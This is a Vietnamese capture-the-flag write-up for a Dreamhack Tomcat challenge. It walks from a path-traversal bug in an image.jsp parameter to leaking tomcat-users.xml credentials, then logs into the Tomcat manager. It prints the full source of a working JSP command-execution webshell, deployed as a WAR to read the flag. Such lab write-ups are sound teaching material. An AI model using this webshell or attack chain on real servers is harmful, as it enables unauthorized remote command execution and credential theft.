## Challenge: Tomcat Manager
### Information
Dream (Dreamee) đã bắt đầu phát triển bằng máy chủ Tomcat.  
Hãy tìm lỗ hổng của dịch vụ này và giành lấy flag.  
Flag nằm ở đường dẫn /flag.  
### Solution
<img src="https://github.com/user-attachments/files/23557713/0.md" width="900">

```html
<html>
<body>
    <center>
        <h2>Under Construction</h2>
        <p>Coming Soon...</p>
        <img src="./image.jsp?file=working.png"/>
    </center>
</body>
</html>
```
View page source ta thấy được đường dẫn `./image.jsp?file=working.png`.  
===> Có khả năng có thể đọc các tệp tin khác trên máy chủ bằng cách thay đổi giá trị của tham số `file`. 
  
Test với `index.jsp`, ta thấy điều trên là hoàn toản khả thi.  
<img src="https://github.com/user-attachments/files/23557712/1.md" width="900">

Tiếp theo ta cố gắng truy cập vào `tomcat-users.xml`  
<img src="https://github.com/user-attachments/files/23557840/2.md" width="900">

Rõ ràng việc truy cập bằng đường dẫn tuyệt đối lấy từ Docker là không thể.  
Do đó ta sẽ tìm đường dẫn tương đối bằng cách lùi dần về các thư mục trước, bắt đầu từ vị trí của `index.jsp`.
<img src="https://github.com/user-attachments/files/23557864/3.md" width="900">

**Save image as** với đuôi `.xml`, sau đó mở file bằng Notepad ta có được `username` và `password`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />  
</tomcat-users>
```

Dùng `username` và `password` vừa tìm được **Sign in** vào trang quản lí của Tomcat: `/manager/html`
<img src="https://github.com/user-attachments/files/23558599/4.md" width="900">

Ta truy cập được trang
<img src="https://github.com/user-attachments/files/23558604/5.md" width="900">

Ta sẽ viết một webshell, nén thành tệp `webshell.war` và tải lên để deploy
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></
```

<img src="https://github.com/user-attachments/files/23558617/7.md" width="900">

Sau khi đã deploy thành công, ta truy cập đến `http://host8.dreamhack.games:24138/webshell/webshell.jsp` và nhập command `ls -al /`  
<img src="https://github.com/user-attachments/files/23558620/8.md" width="700">

Ta thấy file `flag`, đây rõ ràng là file ta cần tìm. Đọc file và ta có được flag.  
<img src="https://github.com/user-attachments/files/23558626/9.md" width="700">



